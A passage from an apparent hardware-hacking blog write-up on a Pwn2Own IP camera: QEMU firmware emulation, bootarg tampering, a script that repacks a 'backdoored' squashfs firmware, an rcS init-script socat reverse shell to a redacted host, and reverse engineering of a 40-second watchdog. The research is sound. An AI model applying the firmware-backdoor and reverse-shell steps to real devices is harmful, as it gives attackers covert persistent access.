+</span></span><span class=line><span class=cl><span class=nb>cd</span> <span class=nv>$BACK</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#just-put-everything-together><h4 id=just-put-everything-together><span class=hanchor arialabel=Anchor># </span>Just put everything together</h4></a><p>Now we have a working kernel and a customized firmware image and we only want to put pieces together and make it run. To achieve that, can use <code>qemu-system-arm</code> with the following options:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=nv>KERNEL</span><span class=o>=</span>./kernel/linux-4.9.84/arch/arm/boot/zImage
+</span></span><span class=line><span class=cl><span class=nv>IMAGE</span><span class=o>=</span>./image/initramfs.gz
+</span></span><span class=line><span class=cl>qemu-system-arm <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        -M virt <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        -nographic <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        -kernel <span class=nv>$KERNEL</span> <span class=se>\\ </span></span></span><span class=line><span class=cl><span class=se></span>        -initrd <span class=nv>$IMAGE</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        -append <span class=s2>&#34;init=/bin/sh&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        -m 256M <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        -snapshot
+</span></span></code></pre></td></tr></table></div></div><p>And..
+<img src=/notes/images/pwn2own-23/2.png width=auto></p><p>We have a working emulated environment!</p><a href=#next-steps-after-the-emulation><h3 id=next-steps-after-the-emulation><span class=hanchor arialabel=Anchor># </span>Next steps after the emulation</h3></a><a href=#sonia-can-you-execute><h4 id=sonia-can-you-execute><span class=hanchor arialabel=Anchor># </span>Sonia, can you execute?</h4></a><p>The first hope we had was to be able to execute the main binaries in order to find a vulnerability on them and develop a reliable exploit. However, things didn&rsquo;t turn out in the best ways.
+As we have mentioned, most of our target services are exposed from a single binary (<code>sonia</code>) and by just executing it, tons of errors were coming out. This is normal and it frequently happens, sometimes it is needed to accomodate some configurations, dependencies or simulate/bypass some behaviors. However, in this case, the <code>sonia</code> binary <strong>highly</strong> depends on a multitude of hardware interactions (through character devices of custom kernel modules) that &ldquo;accommodating&rdquo; everything would required an incredible effort. We even tried to &ldquo;cheat&rdquo; (just to have at least the web service running) by creating a custom kernel driver (in our compiled kernel) that was returning <code>0</code> or <code>1</code> (we tried both) on all <code>open</code>/<code>read</code>/<code>write</code>/<code>ioctl</code> operations, associating with a symlink all character devices to that one. At first, it seemed to work (the binary was going far away from the previous state) but then it was depending on real data from hardware peripherals and at some point, it was failing and exiting.</p><a href=#deploy-custom-firmwares><h4 id=deploy-custom-firmwares><span class=hanchor arialabel=Anchor># </span>Deploy custom firmwares</h4></a><p>Going through the road of emulate hardware interactions was insane due to the time we had allocated, so we choose to use the emulated environment to debug internal behaviors, test cross compiled binaries (unfortunately, we had to) in order to achieve a custom firmware to be deployed in the flash of our target.</p><a href=#flashing-a-custom-firmware><h2 id=flashing-a-custom-firmware><span class=hanchor arialabel=Anchor># </span>Flashing a custom firmware</h2></a><p>At first, we thought that by modifying some firmware parts (especially the root file system) we would have broken the boot chain in its early stages (e.g. the bootloader) due to some integrity failures in the firmware image itself. We tried anyway to modify some firmware parts, flash the new firmware and see what happens. At first everything was ok, the system was booting up without any integrity failures and that&rsquo;s the point where we decided to choose that road: modify the firmware just to have a first foothold on it.</p><a href=#modify-boot-parameters><h3 id=modify-boot-parameters><span class=hanchor arialabel=Anchor># </span>Modify boot parameters</h3></a><p>By looking at the firmware strings (using the <code>strings</code> command) we stumbled in an interesting string at offset <code>0x300000</code> that looked exactly like the boot parameters that are given to the kernel from the bootloader:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>bootargs=mem=64M console=ttyS0,115200 root=/dev/mtdblock5 rootfstype=squashfs
+</span></span></code></pre></td></tr></table></div></div><p>What if we change the bootloader arguments to just execute the <code>/bin/sh</code> binary? That&rsquo;s what we tried. In order to keep the original size and do less noise as possible, we replaced the string <code>rootfstype=squashfs</code> with <code>init=/bin/sh</code> instead of just appending. The replacement was not randomly chosen. Since the kernel can easily guess the filesystem type, specifying its type is optional and can be avoided without side effects. We have also padded, with some spaces, missing bytes and &mldr; <strong>we got a shell</strong> !!!</p><p>Well, a <em>read-only</em>, shell. Just a little detail, right?</p><p>Unfortunately we only had read-only access through the UART interface and, also with the herthbreaking <code>#</code> in front of us, we could not execute anything.</p><a href=#customize-the-root-file-system><h3 id=customize-the-root-file-system><span class=hanchor arialabel=Anchor># </span>Customize the root file system</h3></a><p>Ok, with a little bit of disappointment with the first failure, we were still hyped and hopeful to achieve a first foothold in the system by customizing some parts of the firmware. Targeting the root file system directly seemed really interesting because you can interfere with the init process and execute your own commands. We tried to modify some files without evident side effects and the firmware was, oddly, accepted and booted up! However, <strong>after 40 seconds, the system was rebooting itself</strong>&mldr;</p><a href=#cleanly-extract-and-repack-the-filesystem><h4 id=cleanly-extract-and-repack-the-filesystem><span class=hanchor arialabel=Anchor># </span>Cleanly extract and repack the filesystem</h4></a><p>As we have seen previously, binwalk is really useful but, sometimes, having direct control over the most low-level command for a specific task can avoid issues that can potentially be introduced by a third-party tool (e.g. binwalk in this case). For that reason, we directly used <code>dd</code>, <code>unsquashfs</code> and <code>mksquashfs</code> to recreate valid filesystem images. Due to the repetitive nature of this task, we have developed a basic script, called <code>edward-manidiforbice.sh</code>, that helped us to automate that process (and avoid common mistakes):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
+</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1># script: edward manidiforbice v0.3.2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>cat <span class=s>&lt;&lt; EOF
+</span></span></span><span class=line><span class=cl><span class=s>    _    _
+</span></span></span><span class=line><span class=cl><span class=s>   (_)  / )
+</span></span></span><span class=line><span class=cl><span class=s>     | (_/
+</span></span></span><span class=line><span class=cl><span class=s>    _+/
+</span></span></span><span class=line><span class=cl><span class=s>   //|\\
+</span></span></span><span class=line><span class=cl><span class=s>  // | )
+</span></span></span><span class=line><span class=cl><span class=s> (/  |/      edward manidiforbice v0.3.2 - by xonoxitron &amp; kiks
+</span></span></span><span class=line><span class=cl><span class=s>
+</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Constants</span>
+</span></span><span class=line><span class=cl><span class=nv>fw_original</span><span class=o>=</span><span class=s2>&#34;firmware_dump.bin&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>fw_output</span><span class=o>=</span><span class=s2>&#34;backdoored_firmware.bin&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>squashfs_original</span><span class=o>=</span><span class=s2>&#34;squashfs&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>squashfs_modified</span><span class=o>=</span><span class=s2>&#34;squashfs-mod&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>squashfs_out</span><span class=o>=</span><span class=s2>&#34;unsquashedfs&#34;</span>
+</span></span><span class=line><span class=cl><span class=nv>squashfs_size</span><span class=o>=</span><span class=m>5835455</span>
+</span></span><span class=line><span class=cl><span class=nv>squashfs_offset</span><span class=o>=</span><span class=m>1703936</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Cleaning</span>
+</span></span><span class=line><span class=cl>rm -rf squashfs-root/<span class=p>;</span>
+</span></span><span class=line><span class=cl>rm backdoored_firmware.bin<span class=p>;</span>
+</span></span><span class=line><span class=cl>rm squashfs-mod<span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;# Extracting squafsh filesystem ...&#34;</span>
+</span></span><span class=line><span class=cl>dd <span class=k>if</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$fw_original</span><span class=s2>&#34;</span> <span class=nv>of</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$squashfs_original</span><span class=s2>&#34;</span> <span class=nv>bs</span><span class=o>=</span><span class=m>1</span> <span class=nv>skip</span><span class=o>=</span><span class=nv>$squashfs_offset</span> <span class=nv>count</span><span class=o>=</span><span class=nv>$squashfs_size</span>
+</span></span><span class=line><span class=cl>unsquashfs <span class=nv>$squashfs_original</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;# Backdooring filesystem ...&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1># shirnk other stuff</span>
+</span></span><span class=line><span class=cl><span class=c1># echo 1 &gt; ./squashfs-root/etc/services			# 16kb</span>
+</span></span><span class=line><span class=cl>cp ./patch/rcS ./squashfs-root/etc/init.d/rcS
+</span></span><span class=line><span class=cl>rm ./squashfs-root/bin/dsh 			<span class=c1># 256kb</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;# Re-creating backdoored squashfs image ...&#34;</span>
+</span></span><span class=line><span class=cl>mksquashfs ./squashfs-root/ <span class=nv>$squashfs_modified</span> -noappend -b <span class=m>1048576</span> -Xbcj arm,armthumb -comp xz -Xdict-size <span class=m>1048576</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>squashfs_modified_size</span><span class=o>=</span><span class=k>$(</span>stat -c%s <span class=s2>&#34;</span><span class=nv>$squashfs_modified</span><span class=s2>&#34;</span><span class=k>)</span>
+</span></span><span class=line><span class=cl><span class=nv>size_difference</span><span class=o>=</span><span class=k>$((</span><span class=nv>$squashfs_size</span> <span class=o>-</span> squashfs_modified_size<span class=k>))</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;# Recreated squashfs image: </span><span class=nv>$squashfs_modified_size</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;# Difference between FSs: </span><span class=nv>$size_difference</span><span class=s2> bytes&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>cp <span class=nv>$fw_original</span> <span class=nv>$fw_output</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>dd <span class=k>if</span><span class=o>=</span><span class=nv>$squashfs_modified</span> <span class=nv>of</span><span class=o>=</span><span class=nv>$fw_output</span> <span class=nv>seek</span><span class=o>=</span><span class=nv>$squashfs_offset</span> <span class=nv>bs</span><span class=o>=</span><span class=m>1</span> <span class=nv>conv</span><span class=o>=</span>notrunc
+</span></span><span class=line><span class=cl>dd <span class=k>if</span><span class=o>=</span>/dev/zero  <span class=nv>of</span><span class=o>=</span><span class=nv>$fw_output</span> <span class=nv>seek</span><span class=o>=</span><span class=k>$((</span>squashfs_offset <span class=o>+</span> squashfs_modified_size<span class=k>))</span> <span class=nv>count</span><span class=o>=</span><span class=nv>$size_difference</span> <span class=nv>bs</span><span class=o>=</span><span class=m>1</span> <span class=nv>conv</span><span class=o>=</span>notrunc
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;# Done.&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>The custom firmware recreation needed to take care of a really important thing: in the firmware image, the root file-system is in between multiple sections, meaning that we cannot recreate a filesystem larger than the one that we have. Another annoying factor is that typically firmwares for embedded devices are usually skinned of everything that is not useful to the production use case, leaving us with a really really limited environment. Other things to be aware are the characteristics of the squashfs file-system that we have:</p><ul><li>It is a read-only filesystem - we cannot write files at runtime.</li><li>Its block size is 4KiB (4096 bytes).</li></ul><p>We overcome the read-only file-system issue by manually mounting the sdcard (<code>mount -o rw,exec /dev/mmc0p1 /mnt/sd</code>) in the init process and using it to write files at runtime. The second point is crucial when we want to add or delete files in the image. The final image of this file-system is &ldquo;aligned&rdquo; to 4096 bytes, meaning that it&rsquo;s possible to modify 4.000 bytes without changing the final size of the image but that we need to delete files if we need to write more than that (for that reason, the last lines of the script was checking exactly that before injecting the newly created image in the &ldquo;new&rdquo; firmware).</p><a href=#backdoor-the-init-process><h4 id=backdoor-the-init-process><span class=hanchor arialabel=Anchor># </span>Backdoor the init process</h4></a><p>Without hardware input sources, also a customized firmware that spawns a <code>/bin/sh</code> on its initialization phase wasn&rsquo;t enough. Also, execute sporadically bash commands was not that interesting. However, if you remember from the
+<a href=https://www.hacktivesecurity.com/index.php/2024/12/10/not-all-roads-lead-to-pwn2own-hardware-hacking-part-1/ rel=noopener>previous article</a>, we had manually soldered ethernet pinouts from the hardware. Instead of just executing a classic <code>/bin/sh</code>, we could setup the ethernet interface (modifying the <code>/etc/init.d/rcS</code> script) with an assigned IP and, by directly connecting it to our PC, receive a reverse shell to finally have an interactive environment in our target.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ifconfig eth0 up
+</span></span><span class=line><span class=cl>udhcpc -i eth0
+</span></span><span class=line><span class=cl>ifconfig eth0 &lt;REDACTED&gt;
+</span></span></code></pre></td></tr></table></div></div><p>Setup the interface just requires the above commands that can be inserted inside the <code>rcS</code> init script. The reverse shell, however, was not that easy due to the high <code>busybox</code> limitations (without <code>telnetd</code>, <code>nc</code> or any useful command for a direct reverse shell) and that we are also limited in inserting a custom pre-compiled binary due do the size constraints mentioned above. To solve the size limitation we initially opted to re-compile and replace the busybox binary but then went for a quicker solution: remove what could be considered unnecessary for the camera in the system to save some space, and insert a precompiled binary executable that permitted a reverse shell (e.g. a compatible netcat, socat or a C file with a tiny shellcode). In this stage, the qemu environment turned out to be really useful to test things on a &ldquo;similar&rdquo; environment. At last, we achieved the result by putting a pre-compiled ARM32 EABI version of <code>socat</code> and executing it from the <code>rcS</code> script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/bin/socat tcp-connect:&lt;REDACTED&gt;:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane <span class=p>&amp;</span>
+</span></span></code></pre></td></tr></table></div></div><p>And now.. we have a working (writable) shell!!</p><p>But again, <strong>after 40 seconds</strong>, the camera was rebooting itself..</p><a href=#40-seconds-to-the-hell><h4 id=40-seconds-to-the-hell><span class=hanchor arialabel=Anchor># </span>40 seconds.. to the hell</h4></a><p>Everything that was done until this point didn&rsquo;t take too much time (few days), the &ldquo;nightmare&rdquo; started exactly from now on. Having a reverse shell limited to 40 seconds put us in a successful state of mind that was not &ldquo;real&rdquo;, and this was the key point to the failure of the overall project. In our mind, <em><strong>we just needed</strong></em> to bypass some further integrity checks that were happening in later stages of the system process, but we thought that we were at the &ldquo;<em>95% of the result</em>&rdquo; (cit.). From now on, days and nights of firmware flashing, rabbit holes, reverse engineering, emotions rollercoaster and false hopes were just starting.</p><a href=#freaking-dog-is-that-you><h4 id=freaking-dog-is-that-you><span class=hanchor arialabel=Anchor># </span>Freaking dog, is that you?</h4></a><p>We were now able to execute bash commands through a customized firmware that we could directly flash. Then, after 40 seconds, something reboot the system. This seemed to us like a typical
+<a href=https://developer.toradex.com/software/linux-resources/linux-features/watchdog-linux/ rel=noopener>watchdog</a> scenario where, <em>someone at some point given specific conditions</em>, didn&rsquo;t correctly fed the dog. In fact, watchdog serves specifically for that purpose and is highly adopted in these kind of devices: the system reboot itself if no one has &ldquo;interacted&rdquo; in a specific way with the watchdog service, &ldquo;telling&rdquo; him that everything (e.g. the boot init) was fine.
+In this case, the classic
+<a href=https://linux.die.net/man/8/watchdog rel=noopener>watchdog linux daemon</a> was not used but were able to identify similar behaviors in the <code>rcS</code> and related scripts.
+Inside the <code>rcS</code> init script, we can identify the following commands with a chinese comment:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ...</span>
+</span></span><span class=line><span class=cl><span class=c1>#安霸的看门狗最大超时时间只有65秒，所以在sonia启动前先喂一次狗</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> f &gt; /proc/osa_root/pdc/pdcWdt
+</span></span><span class=line><span class=cl><span class=c1># ...</span>
+</span></span></code></pre></td></tr></table></div></div><p>The translated chinese comment says: &ldquo;<em>The maximum timeout of Ambarella&rsquo;s watchdog is only 65 seconds, so feed the watchdog before starting Sonia</em>&rdquo;. We also found the same command in other init scripts (like <code>/usr/etc/imod</code> and <code>/usr/etc/IPCimod</code>) with the same purpose. We could guess that by writing <code>f</code> into <code>/proc/osa_root/pdc/pdcWdt</code> we would feed the dog, but to be sure we wanted to quickly reverse engineer the kernel module that was handling it. The previously mentioned <code>/usr/etc/imod</code> script (executed from <code>rcS</code>) is responsible to load these kernel modules:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
+</span></span></span><span class=line><span class=cl><span class=cp></span>busybox p7zip x /usr/lib/modules.7z /var/tmp/ &gt; /dev/null
+</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KO_PATH</span><span class=o>=</span>/var/tmp/modules
+</span></span><span class=line><span class=cl>insmod <span class=nv>$KO_PATH</span>/mhal.ko <span class=nv>isp_thread_priority</span><span class=o>=</span><span class=m>98</span>
+</span></span><span class=line><span class=cl>insmod <span class=nv>$KO_PATH</span>/mi_common.ko
+</span></span><span class=line><span class=cl>insmod <span class=nv>$KO_PATH</span>/mi_sys.ko <span class=nv>default_config_path</span><span class=o>=</span>/usr/config <span class=nv>logBufSize</span><span class=o>=</span><span class=m>0</span> <span class=nv>cmdQBufSize</span><span class=o>=</span><span class=m>256</span>
+</span></span><span class=line><span class=cl>insmod <span class=nv>$KO_PATH</span>/mi_sensor.ko
+</span></span><span class=line><span class=cl><span class=c1># ...</span>
+</span></span></code></pre></td></tr></table></div></div><p>We can extract the <code>/usr/lib/modules.7z</code> compressed file and search for the &ldquo;pdcWdt&rdquo; string occurrence in one of the modules and we quickly identified the <code>pdc.ko</code> module. By opening the binary in ghidra, we could easily find its usage:
+<img src=/notes/images/pwn2own-23/3.png width=auto></p><p>We further reverse engineered the module to undertand its logic and we created tons of firmware with different feeding mechanisms: we <code>feed</code> it, set a new one from <code>start</code> and also tried to <code>end</code> it. All trys just lead to the same issue, a reboot after 40 seconds. Maybe there is another watchdog mechanism that we are not aware of?</p><a href=#sonia-are-you-feeding-the-dog><h4 id=sonia-are-you-feeding-the-dog><span class=hanchor arialabel=Anchor># </span>Sonia, are you feeding the dog?</h4></a><p>During this whole process, we also put a lot of effort into reversing (using Binary Ninja) the <code>sonia</code> binary, since the &ldquo;sonia-centric&rdquo; nature of the system. The binary is huge (6.6MB) and stripped (no debug symbols). However, due to the verbose logging on almost all functions, it was easier to recover original function names and understand the main logic. For example, the following <code>onP2PChannelHandler</code> function has been renamed like that due to the <code>may_log</code> (renamed from us) function call that receives as the third parameter the function or method name:
+<img src=/notes/images/pwn2own-23/4.png width=auto></p><p>By looking around the binary searching for some watchdog references, we actually found the following function (renamed to <code>System_startWatchDogTimer</code>):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=mo>000</span><span class=n>d6414</span>  <span class=kt>int32_t</span> <span class=n>System_startWatchDogTimer</span><span class=p>(</span><span class=kt>int32_t</span> <span class=n>arg1</span><span class=p>,</span> <span class=kt>int32_t</span> <span class=n>arg2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d6414</span>      <span class=kt>int32_t</span> <span class=n>var_c</span> <span class=o>=</span> <span class=n>arg2</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d6414</span>      <span class=kt>int32_t</span> <span class=n>var_10_1</span> <span class=o>=</span> <span class=n>arg1</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d6414</span>      
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d6418</span>      <span class=k>if</span> <span class=p>(</span><span class=n>arg1</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d6438</span>          <span class=k>if</span> <span class=p>(</span><span class=n>sub_ae730</span><span class=p>(</span><span class=mh>0x1a</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d643c</span>              <span class=n>PDI_wdtOpen</span><span class=p>(</span><span class=n>arg2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d6440</span>              <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d6418</span>      <span class=k>else</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d6420</span>          <span class=kt>int32_t</span> <span class=n>var_10</span> <span class=o>=</span> <span class=mh>0x6d9</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d642a</span>          <span class=n>log</span><span class=p>(</span><span class=n>arg1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=s>&#34;[libpdi] ERROR  (%s|%d): para: t…&#34;</span><span class=p>,</span> <span class=s>&#34;System_startWatchDogTimer&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d642a</span>      
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>d6444</span>      <span class=k>return</span> <span class=mh>0xffffffff</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>PDI_wdtOpen</code> (manually renamed) is just opening the <code>/dev/pdcWdt</code> character device and store the file descriptor into a global variable. The same global variable is used in the following <code>PDI_wdtFeed</code> function to perform a specific <code>ioctl</code> operation (<code>0xc0105700</code>) on the global file descriptor with a custom structure as input (<code>var_28</code>):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=mo>000</span><span class=n>adc6c</span>  <span class=kt>int32_t</span> <span class=n>PDI_wdtFeed</span><span class=p>(</span><span class=kt>int32_t</span> <span class=n>arg1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc7e</span>      <span class=kt>int32_t</span> <span class=n>var_28</span> <span class=o>=</span> <span class=mh>0xffffffff</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc82</span>      <span class=kt>int32_t</span> <span class=n>dev_pdcWdt_1</span> <span class=o>=</span> <span class=n>dev_pdcWdt</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc86</span>      <span class=kt>int32_t</span> <span class=n>r0</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc86</span>      
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc86</span>      <span class=k>if</span> <span class=p>(</span><span class=n>dev_pdcWdt_1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc8e</span>          <span class=n>r0</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/pdcWdt&#34;</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mh>0xa7c</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>data_645000</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc94</span>          <span class=n>dev_pdcWdt</span> <span class=o>=</span> <span class=n>r0</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc94</span>      
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc96</span>      <span class=kt>int32_t</span> <span class=n>dev_pdcWdt_2</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc96</span>      <span class=kt>char</span> <span class=k>const</span><span class=o>*</span> <span class=k>const</span> <span class=n>r2</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc96</span>      
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc96</span>      <span class=k>if</span> <span class=p>(</span><span class=n>dev_pdcWdt_1</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>r0</span> <span class=n>s</span><span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc9c</span>          <span class=kt>int32_t</span> <span class=n>var_30_1</span> <span class=o>=</span> <span class=mh>0xaa</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc9e</span>          <span class=n>dev_pdcWdt_2</span> <span class=o>=</span> <span class=n>dev_pdcWdt_1</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adca4</span>          <span class=n>r2</span> <span class=o>=</span> <span class=s>&#34;[libpdi] ERROR  (%s|%d): wdt ope…&#34;</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adc96</span>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>arg1</span> <span class=o>==</span> <span class=mi>2</span> <span class=o>||</span> <span class=n>arg1</span> <span class=o>==</span> <span class=mi>3</span> <span class=o>||</span> <span class=n>arg1</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span>
